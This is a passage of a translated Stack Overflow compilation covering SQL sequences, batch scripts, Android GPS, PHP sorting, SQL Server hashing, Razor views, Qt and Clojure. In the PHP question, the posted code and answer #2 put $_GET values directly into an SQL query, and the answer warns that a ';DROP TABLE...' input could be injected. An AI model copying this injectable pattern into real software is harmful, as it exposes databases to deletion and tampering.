编辑（10x 到@Glenn）：

```
SELECT setval('id_seq', max(id)) FROM table; 
```

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2017-01-08T00:24:34.127

我认为有一个更简单的方法：

```
ALTER SEQUENCE "seq_product_id"  RESTART WITH 10 
```

# google-app-engine - 从 Google App Engine 上的文件加载 XML

> ID：10114786
> 
> 赞同：1
> 
> 时间：2012-04-11T22:18:08.477
> 
> 标签：google-app-engine, elementtree, file-not-found

我想做的很简单。使用 ElementTree 加载我的 XML 文件，以便我可以遍历它。

这是代码：

```
_uri = '/news.xml'
self.root = ElementTree.parse(_uri).getroot() 
```

而且，错误：

```
file not accessible: '/news.xml' 
```

据我所知，解析器找不到文档。有什么我需要配置的，以便 python 可以看到我网站的文件吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T22:28:17.033

这可能类似于： [Read a file on App Engine with Python?](https://stackoverflow.com/questions/2630205/read-a-file-on-app-engine-with-python)

即标记为静态的文件不可访问，但您也可以将其用作应用程序资源文件。

# batch-file - 批处理脚本：从集合中排除文件

> ID：10114789
> 
> 赞同：0
> 
> 时间：2012-04-11T22:18:20.117
> 
> 标签：batch-file

我想做一些类似的事情：

```
for %%i not in (*.xml *.doc) do .... 
```

显然，这是行不通的。有没有办法可以在批处理文件中做类似的事情？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-12T02:05:01.407

```
for /f "eol=: delims=" %%i in ('dir /b /a-d *^|findstr /live ".bat .txt"') do ... 
```

***附录***

如果目录列表变得很大，此解决方案将以非线性方式减慢速度。这不太可能是单个目录的问题，但如果使用 DIR /S 选项，则很容易成为问题。通过使用临时文件，可以将解决方案恢复为相对于列表大小具有线性响应时间。

```
set temp1="%temp%\dirExclude1_%random%.txt"
set temp2="%temp%\dirExclude2_%random%.txt"
>%temp1% dir /s /b /a-d *
>%temp2% findstr /live ".bat .txt" %temp1%
for /f "usebackq eol=: delims=" %%i in (%temp2%) do ...
del %temp1%
del %temp2% 
```

这是 Windows 管道的一般限制。对于大量数据，它们变得非常低效。在处理大量数据时，使用临时文件而不是管道总是要快得多。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-12T00:05:20.850

```
@echo off
setlocal EnableDelayedExpansion
rem Build a list of files to exclude
set exclude=
for %%i in (*.xml *.doc) do set "exclude=!exclude!%%i*"
rem Process all but excluded files
for %%i in (*.*) do (
   if "!exclude!" equ "!exclude:%%i*=!" echo Process this one: %%i
) 
```

# android - 在此 Android 应用程序中获取 Gps 位置（经纬度）和时间

> ID：10114793
> 
> 赞同：0
> 
> 时间：2012-04-11T22:19:09.697
> 
> 标签：android, gps

我需要帮助形成我的 android 应用程序。在这个应用程序中，现在，我从表单末尾获取一些数据，然后将其放在数据库中。但我需要显示并且我需要将当前 GPS 位置和当前时间放入数据库。我已经尝试使用教程并在论坛上查看其他帖子但没有结果。我需要帮助，因为我不明白如何使用位置监听器以及我必须在哪里更改项目。谢谢。这是我的代码

窗体.java

```
 import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.AutoCompleteTextView;

public class Form extends Activity {
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
    }

    public void onAddClick(View botton) {
        AutoCompleteTextView spedID = (AutoCompleteTextView) findViewById(R.id.SpedID);
        AutoCompleteTextView spedCliente = (AutoCompleteTextView) findViewById(R.id.SpedCliente);
        AutoCompleteTextView spedCorriere = (AutoCompleteTextView) findViewById(R.id.SpedCorriere);

        Intent intent = new Intent();
        intent.setClass(this, Result.class);

        intent.putExtra("SpedID", spedID.getText().toString());
        intent.putExtra("SpedCliente", spedCliente.getText().toString());
        intent.putExtra("SpedCorriere", spedCorriere.getText().toString());
        startActivity(intent);
    }

    public void onCancelClick(View botton) {
        Intent intent = new Intent();
        intent.setComponent(new ComponentName(this, Result.class));
        intent.putExtra("Cancel", "Cancel");
        startActivity(intent);
    }

} 
```

结果.java

```
import android.app.Activity;
import android.content.ContentValues;
import android.database.sqlite.SQLiteDatabase;
import android.os.Bundle;
import android.widget.TextView;

public class Result extends Activity {
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.result);

        TextView resultText = (TextView) findViewById(R.id.resultText);
        Bundle bundle = getIntent().getExtras();

        if (bundle.getString("Cancel") != null) {
            resultText.setText(getString(R.string.cancelOp));
        } else {
            String spedID = bundle.getString("SpedID");
            String spedCliente = bundle.getString("SpedCliente");
            String spedCorriere = bundle.getString("SpedCorriere");
            insertSpedizione(spedID, spedCliente, spedCorriere); // metodo per
                                                                    // inserire
                                                                    // dati in
                                                                    // db
            resultText.setText(getString(R.string.resultOk) + "\n" + spedID
                    + "\n" + spedCliente + "\n" + spedCorriere);
        }
    }

    private void insertSpedizione(String idsped, String cliente,
            String idcorriere) {
        // metodo insertspedizione riceve in ingresso i parametri sped,cliente
        // etc etc
        DatabaseHelper databaseHelper = new DatabaseHelper(this);
        SQLiteDatabase db = databaseHelper.getWritableDatabase(); // creo un
                                                                    // database
                                                                    // Srivibile

        ContentValues cv = new ContentValues(); // Hashmap
        cv.put(DatabaseHelper.IDSPED, idsped); // nome colonna, valore
        cv.put(DatabaseHelper.CLIENTE, cliente);// nome colonna, valore
        cv.put(DatabaseHelper.IDCORRIERE, idcorriere);// nome colonna, valore

        db.insert("spedizioni", DatabaseHelper.IDSPED, cv); // faccio un insert
                                                            // nella TABLE
                                                            // spedizioni con
                                                            // parametri IDSPED
                                                            // not null e il
                                                            // ContentValues
        db.close(); // quando abbiamo finito chiudiamo
    }

} 
```

数据库助手.java

```
import android.content.Context;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;

public class DatabaseHelper extends SQLiteOpenHelper {
    public static final String DATABASE_NAME = "datasped.db"; // nome database
                                                                // che viene
                                                                // creato da
                                                                // SQLiteOpenHelper
    public static final String IDSPED = "idsped";
    public static final String CLIENTE = "cliente";
    public static final String IDCORRIERE = "idcorriere";

    public DatabaseHelper(Context context) {
        super(context, DATABASE_NAME, null, 1); // 1 è la versione iniziale del
                                                // database che viene aggiornata
                                                // con onUpgrade
    }

    @Override
    public void onCreate(SQLiteDatabase db) { // onCreate crea la
                                                // tabella(formattazione,
                                                // indici, etc) con tutti i dati
                                                // ce voglio nel .db
        db.execSQL("CREATE TABLE spedizioni (_id INTEGER PRIMARY KEY AUTOINCREMENT,idsped TEXT, cliente TEXT,idcorriere TEXT);");
    }// in questo caso mi basta creare una Table semplice con id incrementale
        // per ogni dato inserito

    @Override
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) { // cambia
                                                                                // la
                                                                                // versione
                                                                                // del
                                                                                // database
        android.util.Log.w("spedizioni",
                "Ugrading database, which will destroy all old data");
        db.execSQL("DROP TABLE IF EXIST spedizioni");
        onCreate(db); // ricreo il Database
    }

} 
```

清单.xml

```
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="matteo.android.SpedyGo" android:versionCode="1"
    android:versionName="1.0">
    <uses-sdk android:minSdkVersion="9" />

    <application android:icon="@drawable/icon" android:label="@string/app_name">
        <activity android:name=".Form" android:label="@string/app_name">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <activity android:name=".Result" android:label="@string/result">
        </activity>
    </application>
</manifest> 
```

字符串.xml

```
<resources>
    <string name="hello">Hello World, Form!</string>
    <string name="app_name">SpedyGo</string>
    <string name="InserisciSpedizione">Inserisci Spedizione</string>
    <string name="textsped">Id Spedizione</string>
    <string name="textcliente">Cliente</string>
    <string name="textCorriere">Id Corriere</string>
    <string name="cancel">Cancella</string>
    <string name="confirm">Conferma</string>

    <string name="result">Risultato</string>
    <string name="resultOk">Operazione Avvenuta con Successo</string>
    <string name="cancelOp">Operazione Cancellata</string>
</resources> 
```

主要的.xml

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:orientation="vertical" android:layout_width="fill_parent"
    android:layout_height="fill_parent">
    <TextView android:layout_width="fill_parent"
        android:layout_height="wrap_content" android:text="@string/InserisciSpedizione"
        android:textSize="30sp" android:textStyle="bold" android:gravity="center" />
    <LinearLayout android:layout_width="match_parent"
        android:layout_height="wrap_content" android:id="@+id/linearLayout1">
        <TextView android:layout_width="wrap_content"
            android:layout_height="wrap_content" android:text="@string/textsped"
            android:textStyle="bold" android:padding="5sp" android:width="120sp"
            android:textSize="16sp"></TextView>
        <AutoCompleteTextView android:layout_weight="1"
            android:layout_width="match_parent"
            android:layout_height="wrap_content" android:width="500sp" android:id="@+id/SpedID"></AutoCompleteTextView>
    </LinearLayout>
    <LinearLayout android:layout_width="match_parent"
        android:layout_height="wrap_content" android:id="@+id/linearLayout1">
        <TextView android:layout_width="wrap_content"
            android:layout_height="wrap_content" android:textStyle="bold"
            android:padding="5sp" android:text="@string/textcliente"
            android:textSize="16sp" android:width="120sp"></TextView>
        <AutoCompleteTextView android:layout_weight="1"
            android:layout_width="match_parent"
            android:layout_height="wrap_content" android:width="500sp" android:id="@+id/SpedCliente"></AutoCompleteTextView>
    </LinearLayout>
    <LinearLayout android:layout_width="match_parent"
        android:layout_height="wrap_content" android:id="@+id/linearLayout1">
        <TextView android:layout_width="wrap_content"
            android:layout_height="wrap_content" android:textStyle="bold"
            android:padding="5sp" android:text="@string/textCorriere"
            android:textSize="16sp" android:width="120sp"></TextView>
        <AutoCompleteTextView android:layout_weight="1"
            android:layout_width="match_parent"
            android:layout_height="wrap_content" android:width="500sp" android:id="@+id/SpedCorriere"></AutoCompleteTextView>
    </LinearLayout>
    <LinearLayout android:layout_width="match_parent"
        android:layout_height="wrap_content" android:id="@+id/linearLayout2">
        <Button android:layout_height="wrap_content" android:text="@string/cancel"
            android:layout_width="130sp" android:onClick="onCancelClick"></Button>
        <Button android:layout_height="wrap_content" android:text="@string/confirm"
            android:layout_width="130sp" android:onClick="onAddClick"></Button>
    </LinearLayout>
</LinearLayout> 
```

结果.xml

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:orientation="vertical" android:layout_width="fill_parent"
    android:layout_height="fill_parent">
    <TextView android:layout_width="fill_parent"
        android:layout_height="wrap_content" android:textStyle="bold"
        android:focusableInTouchMode="false" android:textSize="25sp"
        android:padding="10sp" android:gravity="center" android:text="@string/result" />
    <TextView android:layout_width="fill_parent"
        android:layout_height="wrap_content" android:textStyle="bold"
        android:focusableInTouchMode="false" android:textSize="20sp"
        android:padding="10sp" android:gravity="center" android:text=""
        android:id="@+id/resultText" />

</LinearLayout> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T22:47:27.230

这是一个使用网络提供商检索用户位置的简单示例

```
// Acquire a reference to the system Location Manager
        myLocManager = (LocationManager)getSystemService( Context.LOCATION_SERVICE );

        // Define a listener that responds to location updates
        locationListener = new LocationListener()
        {
                    @Override
                    public void onLocationChanged(Location location) 
                    {
                        // Return a string representation of the latitude & longitude. Pass it to the textview and update the text
                        String tempLat = ""+location.getLatitude();
                        String tempLon = ""+location.getLongitude();

                        tempLat = refineStrg( tempLat );
                        tempLon = refineStrg( tempLon );

                        // Store/set lat and long values
                        storeLat_storeLong( tempLat, tempLon );
                    }

                    @Override
                    public void onProviderDisabled(String arg0) 
                    {
                        // TODO Auto-generated method stub

                    }

                    @Override
                    public void onProviderEnabled(String provider) 
                    {
                        // TODO Auto-generated method stub

                    }

                    @Override
                    public void onStatusChanged(String provider, int status, Bundle extras) 
                    {
                        // TODO Auto-generated method stub  
                    }
        };  
        // The two lines below request location updates from the network location provider
        myLocManager.requestLocationUpdates( LocationManager.NETWORK_PROVIDER, 0, 0,locationListener ); 
```

请记住在清单文件中包含适当的权限以访问用户位置（请参阅我在评论中发布的网站）

最后，要检索当前时间，您可以使用 Calendar 或 Date 类，如下所示：

```
Calendar cal = Calendar.getInstance();
cal.getTime(); 
```

[在此处](http://www.mkyong.com/java/java-how-to-get-current-date-time-date-and-calender/)查找有关如何在日历上使用 Date 类的信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T22:38:52.050

宣布`private LocationManager locationManager;`

然后

```
locationManager = (LocationManager) this.getSystemService(Context.LOCATION_SERVICE);
        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, new GeoUpdateHandler()); 
```

接下来创建一个实现 LocationListener 并具有功能的类 GeoUpdateHandler

```
public void onLocationChanged(Location location) {
            int lat = (int) (location.getLatitude() * 1E6);
            int lon = (int) (location.getLongitude() * 1E6);
            String tim = String.format("%d", location.getTime());} 
```

# symfony - 如何在 KnpRadBundle 中注册 FOSUserBundle

> ID：10114794
> 
> 赞同：0
> 
> 时间：2012-04-11T22:19:11.187
> 
> 标签：symfony, fosuserbundle

我安装了 KNP Labs 的 KnpRadBundle，现在我正在努力注册 FOSUserBundle。有人在 KnpRadBundle 中注册过捆绑包吗？

[http://rad.knplabs.com/](http://rad.knplabs.com/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-18T14:14:35.763

我的错... kernel.yml 中缺少捆绑包名称

我有这个：

```
- FOS\UserBundle 
```

虽然它应该是

```
- FOS\UserBundle\FOSUserBundle 
```

这正在工作，很抱歉打开了我自己回答的问题:(

# c# - 未绑定的网格视图或中继器上的 asp.net FindControl

> ID：10114795
> 
> 赞同：0
> 
> 时间：2012-04-11T22:19:14.533
> 
> 标签：c#, asp.net, gridview, repeater, findcontrol

我有一些包含 asp.net GridViews 和中继器的用户控件，在将数据绑定到它们之前，我必须运行一些检查。我需要知道 TemplateField 或 ItemTemplate 中是否存在某些控件。当然我不能做.Row[0].FindControl，因为在这个阶段没有行。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T22:27:06.327

在调用 Databind 之前，您不能检查任何控件的数据绑定模板。

不确定你的情况是什么，但也许你可以遍历你的数据并在那里验证？

# html - 试图在同一行上获取文本

> ID：10114797
> 
> 赞同：0
> 
> 时间：2012-04-11T22:19:16.730
> 
> 标签：html

好的，另一个与此有关的快速问题。我接受了这个建议，效果很好，我现在的困境是桌子之间有一个空间。

我打算附上一个文件，但我想我还没有代表。

无论如何，如果您可以访问[http://www.wholesalecabinets.us/Wall-Cabinets_c_524.html](http://www.wholesalecabinets.us/Wall-Cabinets_c_524.html)，您就会明白我的意思。看看这条线在表格顶部是如何接近的，并且在这条线再次开始之前有一个空格？

我知道，我知道……对你们来说很容易。

抱歉，我是新手，没有太多 HTML 经验，但我需要一些帮助来解决问题。

目前我有一个网站，里面有很多产品。我设法让产品列表非常接近我想要的，除了一个问题，我希望价格与 [name] 在同一行，但在最右边。目前它在最右边的描述下。

任何帮助是极大的赞赏。

谢谢，凯文

```
 <table border="0" cellspacing="0" cellpadding="2" width="95%">
        <tr>
          <td rowspan="2" align="left" valign="top" class="item" style="width:75px;"><a href="product.asp?itemid=[catalogid]&catid=[catid]"><img src="thumbnail.asp?file=[THUMBNAIL]&maxx=50&maxy=50" alt="[name]" border="0" /></a></td>
          <td class="item" align="left" valign="middle"><a href="product.asp?itemid=[catalogid]&catid=[catid]"><span class="item">[name]</span></a><br>
            <span class="item">[description]</span></td>
        </tr>
        <tr>
          <td class="item" align="right" valign="top"><span class="price">[ITEMPRICE]</span>   [product_quantity] 
            <input type="hidden" name="item_id" value="[catalogid]" />
            <input type="text" size="2" name="qty-[counter]" value="0" /></td>
        </tr>
       <img src="assets/templates/[template]/images/div.png" alt="template" vspace="2" width="95%" height="1" />
      </table> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T22:25:31.717

删除这两行

```
 </tr>
         <tr> 
```

当您想要的只是同一原始数据上的新列时，您正在插入一个新行。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T22:25:55.850

您应该能够通过将价格 td 与名称 td 放在同一行中来实现这一点。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-11T22:27:07.393

HTML 中的`<tr>`元素是表格行。您正在寻找的是列。您不能在 HTML 中明确定义列（毕竟 HTML 是一维的），但您可以在行内定义 td（表数据）和 th（表头）元素以有效地创建列。如果您希望商品名称、描述和价格都在同一行，则它们需要位于同一表格行内，分别表示为要么`<td>`或`<th>`元素。

# php - Mysql php多选，排序

> ID：10114798
> 
> 赞同：0
> 
> 时间：2012-04-11T22:19:21.437
> 
> 标签：php, javascript, mysql

你好，我是一个菜鸟，我试图解决这个问题好几个小时。当我选择一个选项时，我尝试让我的 url 看起来像这样。

`category.php?cat_id=122&sort=BOOK_ID+ASC`

我正在尝试使用此代码

```
<form name=\"myform\" \">
<select name=\"sort\" id=\"sort\" style=\"float: right;\" onChange=\"document.myform.submit();\">
    <option value=\"car_ID desc&cat_id=$_GET[cat_id]\">cars desc</option>
    <option value=\"car_ID ASC&cat_id=$_GET[cat_id]\">cars asc</option>
</select>
</form><p>";
    $sort="$_GET[sort]";
     $stm = "SELECT *
           FROM cars
           where cat_id=$_GET[cat_id]
            ORDER BY $sort"; 
```

但结果是这样的： `category.php?sort=car_id+ASC%26cat_id%3D122`

请帮忙...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T22:22:11.813

你的问题在这里：

```
<option value=\"car_ID desc&cat_id=$_GET[cat_id]\">cars desc</option> 
```

你可能想要：

```
<option value=\"cat_id=$_GET[cat_id]&car_ID desc\">cars desc</option> 
```

也就是说，我不确定您的变量 car_ID 来自哪里，并且 car_ID 和“desc”之间的空格会导致您的网址出现问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T22:27:31.027

我会做以下事情：

```
<form name=\"myform\" \">
<input type=\"hidden\" name=\"cat_id\" value=\"$_GET['cat_id']\">
<select name=\"sort\" id=\"sort\" style=\"float: right;\" onChange=\"document.myform.submit();\">

    <option value=\"car_ID desc\">cars desc</option>
    <option value=\"car_ID ASC\">cars asc</option>
</select>
</form><p>";
    $sort="$_GET[sort]";
     $stm = "SELECT *
           FROM cars
           where cat_id=$_GET[cat_id]
            ORDER BY $sort"; 
```

这里有几点说明。首先，这根本不安全。我可以轻松地将“;DROP TABLE...”或其他内容放入 get 变量中。其次，您可能根本不想使用 GET。我会用 POST 处理所有表单输入。

# android - getExternalFilesDir() 返回 null（不是权限问题）

> ID：10114801
> 
> 赞同：20
> 
> 时间：2012-04-11T22:19:43.733
> 
> 标签：android

我已经在一个应用程序上工作了一段时间，并且一直在许多设备上对其进行测试。突然，它停止在摩托罗拉 Xoom 家庭版（Honeycomb 3.1）上工作。每次我尝试运行该应用程序时，它都会在调用 getExternalFilesDir() 时失败，因为该调用将返回 null 而不是 File。

根据我的研究，任何有类似问题的人要么缺少 WRITE_EXTERNAL_STORAGE，从未得到答案，要么正在谈论 Froyo 中的错误。这些都不适用于这里——再说一次，它在其他设备上也能正常工作，我有 WRITE_EXTERNAL_STORAGE 权限，直到几分钟前它甚至还在这个设备上工作。

知道什么可能导致这个问题，或者如何以编程方式防止它？

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-04-11T22:20:50.690

重新启动平板电脑后问题就消失了。这可能只是一些极其罕见的奇怪怪癖，只需重新启动即可解决；我希望不会，因为我希望有一个可靠的方法来防止这种情况发生，而不是仅仅希望遇到这个错误的任何用户都能理解。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-11-02T12:48:37.737

在运行 2.3.6（内核 2.6.35.7-FF1）的三星 SCH-1405（VZW Galaxy II）上也存在同样的问题。获取外部文件目录几个月没有问题然后bam，它开始返回NULL。重新启动手机，问题就消失了。不是什么好兆头。

一个可能的原因可能是我一直在将这款手机切换到 USB 调试模式以获取屏幕截图，并且在没有先从我的 Mac 上卸载手机的文件系统的情况下从手机上拔下 USB 电缆。这是我的新行为。

当我查看 android.os.Environment.getExternalStorageState() 的返回结果存在问题时，我看到“共享”，但是当手机重新启动时，结果是“已安装”。因此，当手机认为外部存储是“共享的”时，它似乎不允许应用程序访问外部存储。这是猜测。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-02-14T20:27:01.493

如果设备处于“大容量存储”模式，则会发生这种情况。如果您将其更改为 MTP 或“仅充电”，则取决于设备，它应该可以工作。这是因为外部数据存储在技术上并未安装到设备上，而是安装到您的计算机上。

# sql - SQL Server 2008 R2 HASHBYTES SHA2 返回 null

> ID：10114804
> 
> 赞同：17
> 
> 时间：2012-04-11T22:19:56.820
> 
> 标签：sql, sql-server-2008, hash

我正在尝试使用带有 SHA2_512 的 HASHBYTES 作为算法。但是，当我尝试在 SQL Server Management Studio 中执行此操作时，我得到的都是空的。

```
SELECT HASHBYTES('SHA1','test') //works
SELECT HASHBYTES('SHA2','test') //returns null 
```

我究竟做错了什么？
有没有办法查看返回值`SELECT HASHBYTES('SHA2', 'test')`？

谢谢

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2012-04-11T22:25:31.997

SQL Server 在 SQL Server 2012+ 中支持 SHA2 512。

SQL Server 2008 R2 及更低版本不支持 SHA2_512。这是[MSDN 上的 HASHBYTES](http://msdn.microsoft.com/en-us/library/ms174415%28v=sql.105%29.aspx)。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2017-12-13T15:31:47.620

这里有一个 128、256 和 512 位的小例子

```
DECLARE @HashThis nvarchar(4000);
SELECT @HashThis = CONVERT(nvarchar(4000),'This is a sample string');
SELECT HASHBYTES('SHA1', @HashThis);
SELECT HASHBYTES('SHA2_256', @HashThis);
SELECT HASHBYTES('SHA2_512', @HashThis);
GO 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-09-11T19:03:50.560

<算法>::= MD2 | MD4 | MD5 | 沙 | SHA1 | SHA2_256 | [每个https://msdn.microsoft.com/en-us/library/ms174415.aspx](https://msdn.microsoft.com/en-us/library/ms174415.aspx)的 SHA2_512

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2017-10-28T13:21:34.680

```
SELECT HASHBYTES('SHA2_256','test')  
SELECT HASHBYTES('SHA2_512','test') 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2018-10-11T20:32:44.723

如果您在 CLR 中使用用户定义函数 (UDF)，则可以在 SQL Server 2008中***返回***哈希值。`SHA512`在没有完整说明如何在 SQLServer 中执行 CLR 的情况下，这里是相关部分。

一、C#CLR代码：

```
using System.Text;
using System.Data.SqlTypes;
using Microsoft.SqlServer.Server;
using System.Security.Cryptography;

public partial class UserDefinedFunctions
{
  [Microsoft.SqlServer.Server.SqlFunction(DataAccess = DataAccessKind.Read)]
  [return: SqlFacet(MaxSize = -1)]
  public static SqlString hash_string_sha512([SqlFacet(MaxSize = -1)]string Value)
  {
    SHA512Managed crypt = new SHA512Managed();
    string hashString = string.Empty;
    byte[] crypto = crypt.ComputeHash(Encoding.UTF8.GetBytes(Value), 0, Encoding.UTF8.GetByteCount(Value));
    foreach (byte bit in crypto)
    {
      hashString += bit.ToString("x2");
    }
    return hashString;
  }
}; 
```

构建您的 CLR 项目，该项目将创建一个 DLL。现在在数据库中为 DLL 创建一个程序集，并注册函数：

```
create assembly MyCode from '[PATH]\[DLL_Name].dll' with permission_set = external_access
create function hash_string_sha512(@val nvarchar(max)) returns nvarchar(max) as external name MyCode.UserDefinedFunctions.hash_string_sha512 
```

现在您可以散列任何字符串：

```
select dbo.hash_string_sha512('What will this look like as a SHA512 hash?') 
```

返回哈希：

> 42f8373d528cb64cdfa7ec4ffb2d754c7d4c37a28959506ec2413aacfe17500db7940ffd887390cb543a8615a6000b4f6bcbd199bb56af91bec84780f236aaf8

# c# - 如何从多对多关系中获取数据？（剃刀）

> ID：10114805
> 
> 赞同：1
> 
> 时间：2012-04-11T22:19:57.063
> 
> 标签：c#, asp.net, asp.net-mvc-3, razor

我刚刚在实体框架代码优先方法中成功地在 BlogPosts 和主题之间建立了多对多关系。因此，BlogPost 可以包含许多主题列表（“CSS”、“HTML”、“ASP.NET”），反之亦然。所以目前我让 EF 创建 3 个表，中间表是 BlogPost 和主题本身的 id。

现在我在我主页的 Razor 视图中。

```
@model MvcBlog.Models.MyModel

@foreach (var post in Model.Posts)
{
    <div class="blogpost">
        <h2>@Html.DisplayFor(modelItem => post.Title)</h2>
        <div class="post_info">@Html.DisplayFor(modelItem => post.DateCreated)<span class="right">Blog</span></div>
        <p>@Html.Raw(post.Content)</p>
        <div class="post_close">
            <span class="left">
                ***********************
            </span>
            <span class="right"><img src="Content/images/comment.jpg" alt="" /> 0 comments</span>
        </div>
    </div>
} 
```

以上所有内容都很好，但我想将***替换为与此特定帖子相关的主题。我似乎无法弄清楚这一点。我是否必须以不同于控制器的方式传递模型？目前我将整个数据库传递到此页面，因为它将使用来自不同表的各种信息。我只是迷失了这个。任何帮助将非常感激！（显然我想对评论做类似的事情）

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T22:26:24.463

不，不，不，不要将整个数据库传递给视图。您需要从数据库中抽象出视图数据。创建一个视图模型，其中仅包含该视图所需的数据，格式最适合视图使用它。根据您相信胖控制器还是瘦控制器，使用控制器或模型代码将数据从数据库转换为视图模型。MVC 的重点是关注点分离，如果您让数据模型泄漏到视图代码中，您将失去这个基本思想，并失去各个层之间松散耦合的好处。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-12T01:21:30.010

让您开始推荐的行动方案。您的视图模型将是一个普通类：

```
public class PostViewModel
{
   public string Title { get; set; }
   public DateTime DateCreated { get; set; }
   public List<Topic> Topics { get; set; }
   public List<Comment> Comments { get; set; }
} 
```

在您的控制器中，您填充视图所需的内容

```
public ActionResult Index()
{
   // assuming entity framework
   List<PostViewModel> posts = (from p in context.Set<Post>()
                                select new PostViewModel {
                                   Title = p.Title,
                                   DateCreated = p.DateCreated,
                                   Topics = p.Topics
                                }).ToList();
   return View(posts);
} 
```

在你看来

```
@model List<PostViewModel>

@foreach(Post post in Model)
{
    @Html.DisplayFor(m=>m.Title)

    @foreach(Topic topic in post.Topics)
    {

    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-11T22:26:04.877

`Do I have to pass the model differently from the controller?`

是的。专门为您的视图需求制作模型（视图模型）。在那里填写正确的对象图（哪个博客去哪个主题）。然后将该实例化对象传递到视图中并在视图中引用这些对象。

# qt - QGraphicsScene::itemAt() - 如何识别自定义类

> ID：10114812
> 
> 赞同：3
> 
> 时间：2012-04-11T22:20:54.450
> 
> 标签：qt, qgraphicsscene

我有一个小问题

我正在编写 Petri Net 模拟器...

我有两个不同的课程

```
 class PNItem : public QObject, public QGraphicsItem
    ... 
```

和

```
 class PNEdge : public QGraphicsLineItem 
```

当我打电话...

```
 QGraphicsItem *QGraphicsScene::ItemAt(//cursor position) 
```

，是否有可能以某种方式了解我点击了什么项目？分别 ItemAt 给了什么项目？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-11T22:35:16.020

由于您只有两种类型，因此您可以使用`dynamic_cast`ing 并检查转换是否成功：

```
QGraphicsItem *item = scene->ItemAt(pos);
PNEdge *as_pnedge;
PNItem *as_pnitem;
if((as_pnedge = dynamic_cast<PNEdge*>(item))){
    // do stuff with as_pnedge
}else if((as_pnitem = dynamic_cast<PNItem*>(item))){
    // do stuff with as_pnitem
} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-11T22:41:16.723

[GraphicsItem::type()](http://qt-project.org/doc/qt-4.8/qgraphicsitem.html#type)旨在用于解决此问题。

所以你会做这样的事情，例如：

```
enum ItemType { TypePNItem = QGraphicsItem::UserType + 1,
                TypePNEdge = QGraphicsItem::UserType + 2 }

class PNItem : public QObject, public QGraphicsItem {

    public:
        int type() { return TypePNItem; }
    ...

}; 
```

这将允许你这样做：

```
QGraphicsItem *item = scene->itemAt( x, y );
switch( item->type() )
{
    case PNItem:
         ...
         break;
} 
```

这样做还可以使用[qgraphicsitem_cast](http://qt-project.org/doc/qt-4.8/qgraphicsitem.html#qgraphicsitem_cast)

参见：[QGraphicsItem::UserType](http://qt-project.org/doc/qt-4.8/qgraphicsitem.html#UserType-var)

# clojure - 使用 clojure twitter-api 获取“java.io.EOFException：JSON 错误”

> ID：10114813
> 
> 赞同：6
> 
> 时间：2012-04-11T22:21:08.890
> 
> 标签：clojure, twitter

我编写了一些简单的 clojure 代码来访问 twitter 流 api。我的代码与 twitter-api 文档中描述的示例代码基本相同：

```
(def ^:dynamic *custom-streaming-callback* 
  (AsyncStreamingCallback. (comp println #(:text %) json/read-json #(str %2)) 
                           (comp println response-return-everything)
                           exception-print))

(defn start-filtering []
  (statuses-filter :params {:follow 12345}
                   :oauth-creds *creds*
                   :callbacks *custom-streaming-callback*)) 
```

我正在关注有关特定用户的推文并使用 oauth 进行身份验证（未显示）。当我运行 start-filtering 方法并使用 twitter 打开连接时，一切正常，但如果流有一段时间不活动（大约 30 秒），即没有关于这个特定用户的推文出现，出现以下错误：

```
#<EOFException java.io.EOFException: JSON error (end-of-file)> 
```

我从 twitter 文档中假设，当使用流连接时，twitter 会无限期地保持流打开。我一定是做了一些不正确的假设。我目前正在研究 clojure twitter-api 代码以查看发生了什么，但我认为更多的眼睛会帮助我更快地解决这个问题。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-13T23:08:17.123

我遇到了和你一样的问题。如您所见，如果在过去 30 秒左右没有收到任何数据，流式处理函数会发出一条空消息。尝试将其读取为 json 会导致您看到的 EOF 异常。

